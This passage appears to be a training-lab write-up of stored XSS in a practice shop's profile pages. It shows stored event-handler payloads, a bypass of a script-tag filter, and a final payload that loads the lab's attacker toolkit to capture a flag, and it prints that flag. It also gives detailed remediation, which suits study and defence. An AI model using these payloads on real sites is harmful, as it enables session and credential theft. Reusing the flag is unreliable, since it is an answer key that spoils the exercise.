- Log keystrokes, capturing credit-card and password entry during checkout.
- Hijack form submissions, deface the page, or pivot to internal admin functionality.

Because the payload is persistent, the compromise continues silently until someone detects it and purges the database — so the blast radius grows with every page view.

### Remediation

- **Context-aware output encoding at render time** for every reflected field, including the author `name`. Encode for the exact context: HTML-entity-encode text nodes (`<`, `>`, `&`, `"`, `'`), and never emit user data with a raw/`|safe` filter.
- **Do not trust "short" or "trusted" fields.** The `name` field was the overlooked sink; apply the same encoding to all user-controlled fields, not just the obvious comment body.
- **Replace blocklist filtering with allowlisting / proper encoding.** Stripping `<script>` is trivially bypassed by event-handler elements (`<img onerror>`, `<svg onload>`); it is not a defense.
- **Deploy a Content-Security-Policy** with per-response nonces and without `unsafe-inline`; this alone would have blocked the injected inline execution and the dynamic `import()` of the attacker toolkit.
- **Keep secrets out of the DOM.** The `tracking-id` token is readable by any script on the page; store sensitive tokens in `HttpOnly` cookies or server-side state instead of hidden DOM elements.
- **Sanitize on output with a vetted library** (e.g. a well-maintained HTML sanitizer) if rich content must be allowed, rather than rendering raw user HTML.



## Task 3: Stored XSS - User Profile

### Vulnerability Description

A Stored Cross-Site Scripting (XSS) vulnerability was identified in the NexusShop user profile functionality. The application retrieves profile data from a JSON API and dynamically inserts the returned values into the Document Object Model (DOM) using JavaScript's `innerHTML` property. Because certain user-controlled fields are not properly sanitized or HTML-encoded, an attacker can store malicious HTML containing JavaScript event handlers that execute when the profile page is loaded.

The vulnerability affects three stages of the profile functionality. Stage 1 permits XSS through the `bio` field. Stage 2 filters `<script>` tags but fails to block JavaScript event handlers. Stage 3 correctly encodes the `bio` field but leaves the `username` field vulnerable. This demonstrates inconsistent input handling and the dangers of inserting untrusted data into HTML-parsing DOM sinks.

The vulnerable frontend code includes:

```javascript
async function loadProfile() {
    const res = await fetch('/profile/api/data');
    const data = await res.json();

    document.getElementById('profile-username').innerHTML = data.username || 'Guest';
    document.getElementById('profile-bio').innerHTML = data.bio || 'No bio set';
    document.getElementById('profile-location').innerHTML = data.location ? '📍 ' + data.location : '';
    document.getElementById('profile-website').innerHTML = data.website ? '🔗 ' + data.website : '';
}
```

The JSON response itself is not executable. The vulnerability occurs when the frontend interprets the stored strings as HTML through `innerHTML`, allowing embedded event handlers to execute.

### Location & Parameters

| Attribute | Details |
|-----------|---------|
| **Application** | NexusShop |
| **Base URL** | `http://web0x0c.hbtn` |
| **Stage 1 URL** | `/profile` |
| **Stage 2 URL** | `/profile/settings` |
| **Stage 3 URL** | `/profile/edit` |
| **Vulnerable Fields** | `bio` (Stages 1 and 2), `username` (Stage 3) |
| **Profile Data API** | `GET /profile/api/data` |
| **Profile Update API** | `POST /profile/api/update` |
| **Tracking Endpoint** | `/profile/api/track` |
| **Type** | Stored XSS through a client-side DOM `innerHTML` sink |
| **Severity** | High |
| **Challenge Level** | 5 |
| **Flag Location** | `web_application_security/websec_0x0C/4-flag.txt` |

### Attack Vector

**1. Identify the profile API and vulnerable DOM sink**

Open `/profile` and inspect the Network tab in Firefox Developer Tools.

The application retrieves profile data through:

```http
GET /profile/api/data
```

The initial API response contains:

```json
{
    "bio": "",
    "location": "",
    "username": "Guest",
    "website": ""
}
```

Inspecting the JavaScript source reveals that all four fields are rendered using `innerHTML` instead of the safer `textContent`.

**2. Stage 1: Confirm stored XSS through the Bio field**

Navigate to `/profile` and enter the following payload into the Bio field:

```html
<img src=x onerror="console.log('PROFILE_XSS_STAGE1_EXECUTED')">
```

Save the profile and reload the page.

The Firefox Console displays:

```text
PROFILE_XSS_STAGE1_EXECUTED
```

The browser attempts to load an invalid image, triggering the `onerror` event handler.

Execution after a reload demonstrates that the malicious HTML was stored persistently and subsequently rendered as executable HTML.

**Result:** Stage 1 stored XSS confirmed.

**3. Stage 2: Bypass the script-tag filter**

Navigate to `/profile/settings`.

First, submit a harmless HTML probe:

```html
<b id="stage2-probe">STAGE2_HTML_OK</b>
```

After saving and reloading, `STAGE2_HTML_OK` appears in bold, confirming that the Bio field is interpreted as HTML.

Next, submit:

```html
<script>console.log('STAGE2_SCRIPT')</script><img src=x onerror="console.log('STAGE2_XSS_EXECUTED')">
```

The application removes the `<script>` element but preserves the image and event handler.

The API returns:

```json
{
    "bio": "<img src=x onerror=\"console.log('STAGE2_XSS_EXECUTED')\">",
    "id": 5,
    "location": "",
    "stage": 2,
    "username": "userSettings",
    "website": ""
}
```

The Firefox Console displays:

```text
STAGE2_XSS_EXECUTED
```

This confirms that filtering `<script>` tags alone does not prevent XSS. JavaScript can execute through HTML event handlers such as `onerror`.

**Result:** Stage 2 stored XSS confirmed, with successful script-tag filter bypass.

**4. Stage 3: Identify the hidden vulnerable field**

Navigate to `/profile/edit`.

The challenge hint suggests that another profile field is vulnerable even though the Bio field is protected.

Test both `username` and `bio` with HTML markup.

Username payload:

```html
<b id="stage3-username-probe">STAGE3_USERNAME_HTML</b>
```

Bio payload:

```html
<b id="stage3-username-probe">STAGE3_BIO_HTML</b>
```

After saving, the API returns:

```json
{
    "bio": "&amp;lt;b id=&amp;quot;stage3-username-probe&amp;quot;&amp;gt;STAGE3_BIO_HTML&amp;lt;/b&amp;gt;",
    "id": 7,
    "location": "",
    "stage": 3,
    "username": "<b id=\"stage3-username-probe\">STAGE3_USERNAME_HTML</b>",
    "website": ""
}
```

The results show:

- `username`: HTML is preserved and rendered as markup.
- `bio`: HTML characters are encoded and the tags are displayed as text.

The `username` field is therefore the confirmed vulnerable input in Stage 3.

**5. Confirm JavaScript execution through Username**

Replace the Username field with:

```html
<img src=x onerror="console.log('PROFILE_XSS_STAGE3_EXECUTED')">
```

Save the profile and reload.

The Firefox Console displays:

```text
PROFILE_XSS_STAGE3_EXECUTED
```

This confirms persistent JavaScript execution through the Username field.

**6. Identify the challenge level and tracking endpoint**

Inspecting the session cookie in Firefox Developer Tools and Base64-decoding its payload reveals the challenge state:

```json
{
    "flags": [],
    "level_5_stage": 1
}
```

The session also contains a session identifier, omitted here.

This identifies the profile challenge as **Level 5**. Stage 3 is the flag-bearing stage.

The tracking endpoint was tested using:

```bash
curl 'http://web0x0c.hbtn/profile/api/track?t=test'
```

Response:

```json
{
    "status": "error"
}
```

The response confirms that the endpoint exists and processes tracking requests, but the supplied test token is invalid.

**7. Execute the Stage 3 flag-capture payload**

Replace the Username field with the lab C2 toolkit payload:

```html
<img src=x onerror="import('/attacker/toolkit.js').then(()=>XSS.pwn(5,3,'/profile/api/track'))">
```

Save the profile and reload.

The payload triggers the image error handler, dynamically loads the lab's C2 toolkit, and calls `XSS.pwn()` with the correct challenge level, stage, and tracking callback.

The tracking request succeeds and returns the flag.

### Payload Used

The final working payload is:

```html
<img src=x onerror="import('/attacker/toolkit.js').then(()=>XSS.pwn(5,3,'/profile/api/track'))">
```

**Payload breakdown:**

| Component | Purpose |
|-----------|---------|
| `<img src=x>` | Forces an image-loading error |
| `onerror` | Executes JavaScript when image loading fails |
| `import('/attacker/toolkit.js')` | Dynamically imports the lab's C2 toolkit |
| `.then(...)` | Executes the next operation after the toolkit loads |
| `XSS.pwn()` | Invokes the lab's compromise and flag-capture workflow |
| `5` | Challenge level |
| `3` | Challenge stage |
| `/profile/api/track` | Tracking callback endpoint |

The payload avoids `<script>` elements entirely and exploits the application's unsafe HTML rendering behavior.

### Evidence

**1. Stored XSS execution**

Stage 1 Console:

```text
PROFILE_XSS_STAGE1_EXECUTED
```

Stage 2 Console:

```text
STAGE2_XSS_EXECUTED
```

Stage 3 Console:

```text
PROFILE_XSS_STAGE3_EXECUTED
```

These results confirm JavaScript execution from the stored profile fields.

**2. API persistence and filtering behavior**

The API responses demonstrate that:

- Stage 1 allows the Bio field to execute stored HTML event handlers.
- Stage 2 removes script tags but preserves executable event handlers.
- Stage 3 encodes the Bio field but preserves raw HTML in Username.

The payloads remain effective after reloading the relevant profile pages.

**3. C2 toolkit execution and tracking**

The final stored payload invokes:

```javascript
XSS.pwn(5, 3, '/profile/api/track')
```

The Network response from `/profile/api/track` is:

```json
{
    "ref": "FLAG{dde3e144519a50db0432f0422cf8d85e}",
    "status": "tracked"
}
```

This confirms successful execution of the flag-capture workflow and acceptance of the tracking callback.

The tracking response is verified evidence. A separate C2 dashboard screenshot or recorded stolen-data entry was not captured during this task, so actual credential or cookie extraction is not independently established by the available evidence.

**4. Captured flag**

```text
FLAG{dde3e144519a50db0432f0422cf8d85e}
```

Required submission file:

```text
web_application_security/websec_0x0C/4-flag.txt
```

File contents:

```text
dde3e144519a50db0432f0422cf8d85e
```

**Result:** Task 3, Level 5, Stage 3 successfully completed.

### Real-World Impact

A stored XSS vulnerability in a user profile can allow an attacker to execute arbitrary JavaScript in the browser of anyone who views the affected profile, subject to the application's access controls.

Potential consequences include:

1. **Session compromise:** Access to JavaScript-readable session tokens and authentication data. Cookies marked `HttpOnly` cannot be read directly through `document.cookie`.

2. **Credential theft:** Injection of deceptive login forms or interception of credentials entered into vulnerable application forms.

3. **Unauthorized actions:** Performing authenticated requests within the victim's browser using the victim's active session.

4. **Data exfiltration:** Reading accessible application data and transmitting it to an attacker-controlled endpoint.

5. **Persistent compromise:** Malicious code remains stored and can execute repeatedly whenever the affected profile is loaded.

6. **Browser-side content manipulation:** Modifying trusted application pages to impersonate interface elements, mislead users, or redirect interactions.

The vulnerability is particularly dangerous because the malicious payload is stored on the server. Unlike reflected XSS, exploitation does not require victims to follow a specially constructed malicious URL.

### Remediation

**1. Replace `innerHTML` with `textContent`**

For profile fields intended to contain plain text, use `textContent` rather than `innerHTML`.

Vulnerable:

```javascript
document.getElementById('profile-username').innerHTML = data.username || 'Guest';
```

Corrected:

```javascript
document.getElementById('profile-username').textContent = data.username || 'Guest';
```

Apply the same approach to all plain-text profile fields.

```javascript
document.getElementById('profile-bio').textContent =
    data.bio || 'No bio set';

document.getElementById('profile-location').textContent =
    data.location ? '📍 ' + data.location : '';

document.getElementById('profile-website').textContent =
    data.website ? '🔗 ' + data.website : '';
```

`textContent` inserts strings as text rather than interpreting them as HTML, preventing embedded tags and event handlers from becoming executable markup.

**2. Sanitize HTML when rich-text formatting is required**

If the application intentionally supports formatted profile biographies, use a maintained HTML sanitizer such as DOMPurify.

```javascript
document.getElementById('profile-bio').innerHTML =
    DOMPurify.sanitize(data.bio || 'No bio set');
```

Configure an appropriate allowlist of elements and attributes.

**3. Apply context-aware output encoding**

Ensure user-controlled values are encoded for the context in which they appear:

- HTML text content
- HTML attributes
- JavaScript strings
- URLs

Encoding rules differ between these contexts. Generic filtering and inconsistent HTML entity encoding are not reliable substitutes for correct output handling.

**4. Enforce server-side validation**

Validate profile fields based on their intended purpose:

- Username should contain only allowed characters and meet length restrictions.
- Website values should be validated as URLs with permitted schemes.
- Location should be treated as plain text unless a defined markup format is required.
- Bio content should follow an explicit plain-text or sanitized-rich-text policy.

Server-side validation should complement, not replace, safe DOM rendering.

**5. Implement a Content Security Policy (CSP)**

Deploy a restrictive CSP that disallows inline JavaScript event handlers and restricts script sources.

For example, where compatible with the application:

```http
Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'; base-uri 'self'
```

A properly enforced CSP can substantially reduce XSS exploitability, but it should be a defense-in-depth control rather than the primary fix.

**6. Avoid blacklist-based filtering**

Stage 2 demonstrates that removing `<script>` elements does not eliminate executable HTML.

The application must not rely on a list of forbidden tags or event handlers. The preferred solution is to prevent untrusted strings from entering executable DOM contexts.

**7. Add automated XSS regression tests**

Include tests for all profile fields, especially `username`, `bio`, `location`, and `website`.

Verify that malicious HTML remains inert after storage, API retrieval, and client-side rendering.

Test asynchronous rendering and page reloads to ensure stored payloads cannot become executable through later DOM updates.

### Conclusion

Task 3 demonstrated a stored XSS vulnerability caused by unsafe client-side rendering of profile data retrieved through a JSON API.

All three stages were investigated:

- **Stage 1:** Stored XSS through Bio.
- **Stage 2:** Script-tag filtering bypassed using an HTML event handler.
- **Stage 3:** Stored XSS through Username despite HTML encoding being applied to Bio.

The final exploit successfully invoked the lab C2 toolkit and obtained the Stage 3 flag through `/profile/api/track`.

**The main security lesson is that JSON transport does not guarantee safe DOM rendering.** Untrusted data becomes dangerous when it is passed to HTML-parsing sinks such as `innerHTML`, and protecting one profile field does not secure other fields rendered by the same frontend.


